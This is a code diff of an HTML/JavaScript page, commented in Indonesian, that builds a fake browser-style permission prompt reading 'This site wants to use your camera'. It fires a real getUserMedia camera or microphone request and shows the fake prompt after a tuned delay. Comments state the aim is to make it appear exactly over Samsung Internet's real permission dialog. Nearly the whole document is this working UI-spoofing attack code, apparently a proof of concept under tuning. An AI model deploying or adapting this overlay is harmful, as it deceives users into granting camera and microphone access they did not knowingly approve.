@@ -9,76 +9,90 @@
   button { padding: 15px 30px; font-size: 18px; margin: 10px; border: none; border-radius: 8px; cursor: pointer; }
   #log { margin-top: 20px; font-size: 14px; color: #888; text-align: center; padding: 0 20px; }
 
-  #alertBox {
+  /* Fake native-style alert — muncul di bawah, menimpa area dialog izin asli */
+  #fakeAlert {
     display: none;
-    position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
-    width: 85%; max-width: 360px;
+    position: fixed;
+    bottom: 25vh;                 /* turunkan/naikkan sesuai posisi dialog asli */
+    left: 50%; transform: translateX(-50%);
+    width: 88%; max-width: 340px;
     background: #fff; color: #202124;
-    border-radius: 12px; padding: 20px;
-    box-shadow: 0 4px 20px rgba(0,0,0,0.5);
-    font-size: 15px; z-index: 10000;
+    border-radius: 16px;
+    padding: 22px 20px 16px;
+    box-shadow: 0 6px 24px rgba(0,0,0,0.55);
+    font-size: 15px; line-height: 1.4;
+    z-index: 10000;
   }
-  #alertBox .msg { margin-bottom: 18px; }
-  #alertBox .btns { display: flex; justify-content: flex-end; gap: 8px; padding-right: 30px; }
-  #alertBox .btns button {
-    margin: 0; padding: 10px 22px; font-size: 15px;
+  #fakeAlert .msg { margin-bottom: 18px; font-weight: 500; }
+  #fakeAlert .btns {
+    display: flex; justify-content: flex-end; gap: 6px;
+    padding-right: 24px;          /* geser tombol kanan sedikit ke kiri */
   }
-  #btnAllow { background: #1a73e8; color: #fff; }
-  #btnDeny  { background: transparent; color: #1a73e8; }
+  #fakeAlert .btns button {
+    margin: 0; padding: 10px 20px; font-size: 15px; border-radius: 20px;
+  }
+  #fDeny  { background: transparent; color: #1a73e8; }
+  #fAllow { background: #1a73e8; color: #fff; }
+
+  #debug { position: fixed; top: 5px; right: 5px; font-size: 11px; color: #666; }
 </style>
 </head>
 <body>
-<button onclick="askCam()">Request Camera</button>
-<button onclick="askMic()">Request Microphone</button>
-<button onclick="askBoth()">Request Both</button>
+<button onclick="triggerCam()">Request Camera</button>
+<button onclick="triggerMic()">Request Microphone</button>
+<button onclick="triggerBoth()">Request Both</button>
 <div id="log"></div>
+<div id="debug"></div>
 
-<div id="alertBox">
-  <div class="msg" id="alertMsg">This is an alert message.</div>
+<div id="fakeAlert">
+  <div class="msg" id="fakeMsg">Alert</div>
   <div class="btns">
-    <button id="btnDeny">Deny</button>
-    <button id="btnAllow">Allow</button>
+    <button id="fDeny">Deny</button>
+    <button id="fAllow">Allow</button>
   </div>
 </div>
 
 <script>
 const log = document.getElementById('log');
+const fakeAlert = document.getElementById('fakeAlert');
 
-async function askCam() {
+// Delay sebelum fake alert muncul — tune sampai fake alert muncul
+// TEPAT saat dialog izin asli Samsung Internet selesai muncul.
+const FAKE_DELAY_MS = 400;
+
+async function requestPerm(constraints) {
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
     stream.getTracks().forEach(t => t.stop());
-    log.textContent = 'CAMERA ALLOWED';
-  } catch (e) { log.textContent = 'camera: ' + e.name; }
+    log.textContent = 'GRANTED';
+  } catch (e) {
+    log.textContent = 'error: ' + e.name;
+  }
 }
 
-async function askMic() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-    stream.getTracks().forEach(t => t.stop());
-    log.textContent = 'MICROPHONE ALLOWED';
-  } catch (e) { log.textContent = 'mic: ' + e.name; }
+function trigger(constraints, label) {
+  // Kirim request — dialog izin asli Samsung akan muncul di bawah layar
+  requestPerm(constraints);
+
+  // Munculkan fake alert pada timing yang disinkronkan
+  document.getElementById('fakeMsg').textContent = label;
+  setTimeout(() => {
+    fakeAlert.style.display = 'block';
+    document.getElementById('debug').textContent = 'fake alert shown @ ' + Date.now();
+  }, FAKE_DELAY_MS);
 }
 
-async function askBoth() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-    stream.getTracks().forEach(t => t.stop());
-    log.textContent = 'BOTH ALLOWED';
-  } catch (e) { log.textContent = 'both: ' + e.name; }
-}
+function triggerCam() { trigger({ video: true }, 'This site wants to use your camera'); }
+function triggerMic() { trigger({ audio: true }, 'This site wants to use your microphone'); }
+function triggerBoth(){ trigger({ video: true, audio: true }, 'This site wants to use your camera and microphone'); }
 
-function showAlert(msg) {
-  document.getElementById('alertMsg').textContent = msg;
-  document.getElementById('alertBox').style.display = 'block';
-}
-
-document.getElementById('btnAllow').addEventListener('click', () => {
-  document.getElementById('alertBox').style.display = 'none';
-  askBoth();
+document.getElementById('fAllow').addEventListener('click', () => {
+  fakeAlert.style.display = 'none';
+  log.textContent = 'fake Allow tapped';
 });
-document.getElementById('btnDeny').addEventListener('click', () => {
-  document.getElementById('alertBox').style.display = 'none';
+document.getElementById('fDeny').addEventListener('click', () => {
+  fakeAlert.style.display = 'none';
+  log.textContent = 'fake Deny tapped';
 });
 </script>
 </body>
